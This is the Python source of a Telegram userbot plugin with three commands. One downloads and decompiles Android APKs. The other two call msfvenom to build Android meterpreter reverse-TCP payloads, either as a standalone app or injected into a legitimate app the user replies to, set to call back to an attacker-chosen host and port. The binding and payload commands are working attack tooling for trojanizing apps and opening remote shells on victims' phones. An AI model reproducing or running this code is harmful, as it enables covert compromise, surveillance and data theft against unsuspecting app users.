
from userbot.events import javes05
from pathlib import Path

import json, os, subprocess, time, math, asyncio
from pySmartDL import SmartDL
from hachoir.metadata import extractMetadata
from hachoir.parser import createParser
from telethon.tl.types import DocumentAttributeVideo
from userbot import LOGS, CMD_HELP, TEMP_DOWNLOAD_DIRECTORY
import os
import asyncio
from getpass import getuser
from os import remove
from subprocess import PIPE
from subprocess import run as runapp
import pybase64
from sys import executable
from userbot import CMD_HELP, BOTLOG, BOTLOG_CHATID
from userbot.events import javes05, bot, rekcah05
javes = client = bot
from userbot import CMD_HELP, ALIVE_NAME, PM_MESSAGE, JAVES_NAME, JAVES_MSG, ORI_MSG
JAVES_NNAME = str(JAVES_NAME) if JAVES_NAME else str(JAVES_MSG)
FULL_SUDO = os.environ.get("FULL_SUDO", None)
import inspect
running_processes: dict = {}



async def progress(current, total, event, start, type_of_ps, file_name=None):
    now = time.time()
    diff = now - start
    if round(diff % 10.00) == 0 or current == total:
        percentage = current * 100 / total
        speed = current / diff
        elapsed_time = round(diff) * 1000
        time_to_completion = round((total - current) / speed) * 1000
        estimated_total_time = elapsed_time + time_to_completion
        progress_str = "[{0}{1}] {2}%\n".format(
            ''.join(["█" for i in range(math.floor(percentage / 10))]),
            ''.join(["░" for i in range(10 - math.floor(percentage / 10))]),
            round(percentage, 2))
        tmp = progress_str + \
            "{0} of {1}\nETA: {2}".format(
                humanbytes(current),
                humanbytes(total),
                time_formatter(estimated_total_time)
            )
        if file_name:
            await event.edit("{}\nFile Name: `{}`\n{}".format(
                type_of_ps, file_name, tmp))
        else:
            await event.edit("{}\n{}".format(type_of_ps, tmp))
            
def humanbytes(size):
    if not size:
        return ""
    power = 2**10
    raised_to_pow = 0
    dict_power_n = {0: "", 1: "Ki", 2: "Mi", 3: "Gi", 4: "Ti"}
    while size > power:
        size /= power
        raised_to_pow += 1
    return str(round(size, 2)) + " " + dict_power_n[raised_to_pow] + "B"


def time_formatter(milliseconds: int) -> str:
    seconds, milliseconds = divmod(int(milliseconds), 1000)
    minutes, seconds = divmod(seconds, 60)
    hours, minutes = divmod(minutes, 60)
    days, hours = divmod(hours, 24)
    tmp = ((str(days) + " day(s), ") if days else "") + \
        ((str(hours) + " hour(s), ") if hours else "") + \
        ((str(minutes) + " minute(s), ") if minutes else "") + \
        ((str(seconds) + " second(s), ") if seconds else "") + \
        ((str(milliseconds) + " millisecond(s), ") if milliseconds else "")
    return tmp[:-2]




textt = "**Terminal Status**"












@javes05(outgoing=True, pattern="^!decompile(?: |$)(.*)")
async def _(event):  
    textt = "**Terminal Status**"
    message = (str(event.chat_id) + ':' + str(event.message.id))
    await event.edit(f"{textt}\n\nAnalyzing Datas......")
    input_str = event.pattern_match.group(1)
    if not os.path.isdir(TEMP_DOWNLOAD_DIRECTORY):
        os.makedirs(TEMP_DOWNLOAD_DIRECTORY)
    if "|" in input_str:
        url, file_name = input_str.split("|")
        url = url.strip()      
        file_name = file_name.strip()
        head, tail = os.path.split(file_name)
        if head:
            if not os.path.isdir(os.path.join(TEMP_DOWNLOAD_DIRECTORY, head)):
                os.makedirs(os.path.join(TEMP_DOWNLOAD_DIRECTORY, head))
                file_name = os.path.join(head, tail)
        downloaded_file_name = TEMP_DOWNLOAD_DIRECTORY + "" + file_name
        downloader = SmartDL(url, downloaded_file_name, progress_bar=False)
        downloader.start(blocking=False)
        c_time = time.time()
        display_message = None
        while not downloader.isFinished():
            status = downloader.get_status().capitalize()
            total_length = downloader.filesize if downloader.filesize else None
            downloaded = downloader.get_dl_size()
            now = time.time()
            diff = now - c_time
            percentage = downloader.get_progress() * 100
            speed = downloader.get_speed()
            elapsed_time = round(diff) * 1000
            progress_str = "[{0}{1}] {2}%".format(
                ''.join(["█" for i in range(math.floor(percentage / 10))]),
                ''.join(["░"
                         for i in range(10 - math.floor(percentage / 10))]),
                round(percentage, 2))
            estimated_total_time = downloader.get_eta(human=True)
            try:
                current_message = f"{status}..\
                \nURL: {url}\
                \nFile Name: {file_name}\
                \n{progress_str}\
                \n{humanbytes(downloaded)} of {humanbytes(total_length)}\
                \nETA: {estimated_total_time}"

                if round(diff %
                         10.00) == 0 and current_message != display_message:
                    await event.edit(current_message)
                    display_message = current_message
            except Exception as e:
                LOGS.info(str(e))
        if downloader.isSuccessful():
            await event.edit(f"{textt} \n\nDownloaded  successfully !!")
        else:
            await event.edit("Incorrect URL\n{}".format(url))
    elif event.reply_to_msg_id:
        try:
            c_time = time.time()
            downloaded_file_name = await event.client.download_media(
                await event.get_reply_message(),
                TEMP_DOWNLOAD_DIRECTORY,
                progress_callback=lambda d, t: asyncio.get_event_loop(
                ).create_task(
                    progress(d, t, event, c_time, f"{textt} \n\nDownloading...")))
        except Exception as e:  # pylint:disable=C0103,W0703
            await event.edit(str(e))
        else:
            await event.edit(f"{textt} \n\nDownloaded successfully !!")
    else:
        return await event.edit(f"Error\n`Reply to an apk to Decompile.`")
    await event.edit(f"{textt} \n\nDecompiling......")
    cmd = f"rm -rf decompiled.zip decompiled && apktool d {downloaded_file_name} -o decompiled && zip -r decompiled.zip decompiled && rm -rf {downloaded_file_name}"       
    process = await asyncio.create_subprocess_shell(
        cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    running_processes.update({message: process})
    stdout, stderr = await process.communicate()
    not_killed = running_processes.get(message, False)
    if not_killed:
        del running_processes[message]    
    text = f"[Return code]:\n {process.returncode}\n\n"
    if stdout:    	
        text += "\n[stdout]\n" + stdout.decode("UTF-8").strip() + "\n"
    if stderr:
        text += "\n[stderr]\n" + stderr.decode('UTF-8').strip() + "\n"   
    if stdout or stderr:
       output = open("decompiled.txt", "w+")
       output.write(text)
       output.close()
       await event.client.send_file(event.chat_id, "decompiled.txt", reply_to=event.id, caption=f"`{JAVES_NNAME}:` **Decompiled Details**")
       os.remove("decompiled.txt")           
    my_file = Path("decompiled.zip")
    if not my_file.exists():
    	return await event.reply(f"{textt}\n\nError: Decompile failed")
    await event.edit(f"{textt}\n\nRe Analyzing Datas......")
    input_str = "decompiled.zip"
    if os.path.exists(input_str):
        c_time = time.time()
        await event.client.send_file(
            event.chat_id,
            input_str,
            force_document=True,
            allow_cache=False,
            reply_to=event.message.id,
            progress_callback=lambda d, t: asyncio.get_event_loop(
            ).create_task(
                progress(d, t, event, c_time, f"{textt} \n\nUploading Decompiled files as zip...", input_str)))
        await event.edit(f"{textt} \n\n Decompiled and uploaded successfully !!")
    else:
        return await event.edit("{textt}\n\nAdnormal Error")






@javes05(outgoing=True, pattern="^!bindapk(?: |$)(.*)")
async def _(event):
    await event.edit(f"{textt}\n\nAnalyzing Datas......")
    message = (str(event.chat_id) + ':' + str(event.message.id))
    input_str = event.pattern_match.group(1)
    if not input_str:
    	return await event.edit(f"Error\nUsage : !bindapk <lhost> <lport> reply to an app")
    args = input_str.split()
    try:
       lhost = str(args[0])
    except:
    	return await event.edit(f"Error\nUsage : !bindapk <lhost> <lport> reply to an app")
    try:
        lport = str(args[1])    
    except:
    	return await event.edit(f"Error\nUsage : !bindapk <lhost> <lport> reply to an app")
    if not os.path.isdir(TEMP_DOWNLOAD_DIRECTORY):
        os.makedirs(TEMP_DOWNLOAD_DIRECTORY)
    if "|" in input_str:
        url, file_name = input_str.split("|")
        url = url.strip()      
        file_name = file_name.strip()
        head, tail = os.path.split(file_name)
        if head:
            if not os.path.isdir(os.path.join(TEMP_DOWNLOAD_DIRECTORY, head)):
                os.makedirs(os.path.join(TEMP_DOWNLOAD_DIRECTORY, head))
                file_name = os.path.join(head, tail)
        downloaded_file_name = TEMP_DOWNLOAD_DIRECTORY + "" + file_name
        downloader = SmartDL(url, downloaded_file_name, progress_bar=False)
        downloader.start(blocking=False)
        c_time = time.time()
        display_message = None
        while not downloader.isFinished():
            status = downloader.get_status().capitalize()
            total_length = downloader.filesize if downloader.filesize else None
            downloaded = downloader.get_dl_size()
            now = time.time()
            diff = now - c_time
            percentage = downloader.get_progress() * 100
            speed = downloader.get_speed()
            elapsed_time = round(diff) * 1000
            progress_str = "[{0}{1}] {2}%".format(
                ''.join(["█" for i in range(math.floor(percentage / 10))]),
                ''.join(["░"
                         for i in range(10 - math.floor(percentage / 10))]),
                round(percentage, 2))
            estimated_total_time = downloader.get_eta(human=True)
            try:
                current_message = f"{status}..\
                \nURL: {url}\
                \nFile Name: {file_name}\
                \n{progress_str}\
                \n{humanbytes(downloaded)} of {humanbytes(total_length)}\
                \nETA: {estimated_total_time}"

                if round(diff %
                         10.00) == 0 and current_message != display_message:
                    await event.edit(current_message)
                    display_message = current_message
            except Exception as e:
                LOGS.info(str(e))
        if downloader.isSuccessful():
            await event.edit(f"{textt} \n\nDownloaded  successfully !!")
        else:
            await event.edit("Incorrect URL\n{}".format(url))
    elif event.reply_to_msg_id:
        try:
            c_time = time.time()
            downloaded_file_name = await event.client.download_media(
                await event.get_reply_message(),
                TEMP_DOWNLOAD_DIRECTORY,
                progress_callback=lambda d, t: asyncio.get_event_loop(
                ).create_task(
                    progress(d, t, event, c_time, f"{textt} \n\nDownloading...")))
        except Exception as e:  # pylint:disable=C0103,W0703
            await event.edit(str(e))
        else:
            await event.edit(f"{textt} \n\nDownloaded successfully !!")
    else:
        return await event.edit(f"Error\n`Reply to an apk to bind.`")

    await event.edit(f"{textt} \n\nBinding Apk with\n **Lhost:** `{lhost}` \n **Lport:** `{lport}`\nplease wait.....")
    cmd = f"rm -rf binded.apk && msfvenom -x {downloaded_file_name} -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} --platform android --arch dalvik AndroidHideAppIcon=false AndroidMeterpreterDebug=false AndroidWakelock=true -o binded.apk ; rm -rf {downloaded_file_name}"     
    process = await asyncio.create_subprocess_shell(
        cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    running_processes.update({message: process})
    stdout, stderr = await process.communicate()
    not_killed = running_processes.get(message, False)
    if not_killed:
        del running_processes[message]    
    text = f"[Command]:\n {cmd}\n[Return code]: {process.returncode}\n\n"
    if stdout:    	
        text += "\n[stdout]\n" + stdout.decode("UTF-8").strip() + "\n"
    if stderr:
        text += "\n[stderr]\n" + stderr.decode('UTF-8').strip() + "\n"   
    if stdout or stderr:
       output = open("binded.txt", "w+")
       output.write(text)
       output.close()
       await event.client.send_file(event.chat_id, "binded.txt", reply_to=event.id, caption=f"**Bind Details**")
       os.remove("binded.txt")           
    my_file = Path("binded.apk")
    if not my_file.exists():
    	return await event.reply(f"{textt}\n\nError: failed to bind this apk")
    await event.edit(f"{textt}\n\nBinded Successfully Re Analyzing Datas......")
    input_str = "binded.apk"
    if os.path.exists(input_str):
        c_time = time.time()
        await event.client.send_file(
            event.chat_id,
            input_str,
            force_document=True,
            allow_cache=False,
            reply_to=event.message.id,
            progress_callback=lambda d, t: asyncio.get_event_loop(
            ).create_task(
                progress(d, t, event, c_time, f"{textt} \n\nUploading ...", input_str)))
        await event.edit(f"{textt} \n\n Binded this apk  with `{lhost}:{lport}` and uploaded successfully !!")
    else:
        return await event.edit("{textt}\n\nAdnormal Error")


@javes05(outgoing=True, pattern="^!payloadapk(?: |$)(.*)")
async def _(event):
     await event.edit(f"{textt}\n\nAnalyzing Datas......")
     input_str = event.pattern_match.group(1)
     if not input_str:
    	   return await event.edit(f"Error\nUsage : !payload <lhost> <lport>")
     args = input_str.split()
     try:
       lhost = str(args[0])
     except:
       	return await event.edit(f"Error\nUsage : !payload <lhost> <lport>")
     try:
        lport = str(args[1])    
     except:
       	return await event.edit(f"Error\nUsage : !payload <lhost> <lport>")
     await event.edit(f"{textt} \n\nBinding Apk with\n **Lhost:** `{lhost}` \n **Lport:** `{lport}`\nCheck heroku logs for more information...")
     os.system(f"rm -rf payload.apk && msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o payload.apk") 
     my_file = Path("payload.apk")
     if not my_file.exists():
    	    return await event.reply(f"{textt}\n\nError: Payload failed,  please check heroku logs..... or type !logs")
     await event.edit(f"{textt}\n Re Analyzing Datas......")
     input_str = "payload.apk"
     if os.path.exists(input_str):
        c_time = time.time()
        await event.client.send_file(
            event.chat_id,
            input_str,
            force_document=True,
            allow_cache=False,
            reply_to=event.message.id,
            progress_callback=lambda d, t: asyncio.get_event_loop(
            ).create_task(
                progress(d, t, event, c_time, f"{textt} \n\nUploading payload apk...", input_str)))
        await event.edit(f"{textt} \n\n Payload apk with {lhost}:{lport} uploaded successfully !!")
     else:
        return await event.edit("{textt}\n\nAdnormal Error")


     
	




CMD_HELP.update({
    "advance":
    "`!decompile <reply to an app>`\
\n**Usage:** decompile app , send as zip file.\
`!payloadapk <lhost> <lport>`\
\n**Usage:** make metasploit android payload for msfconsole.\
`!bindapk <lhost> <lport> <reply to an app>`\
\n**Usage:** inject metasploit payload .\
"
})





    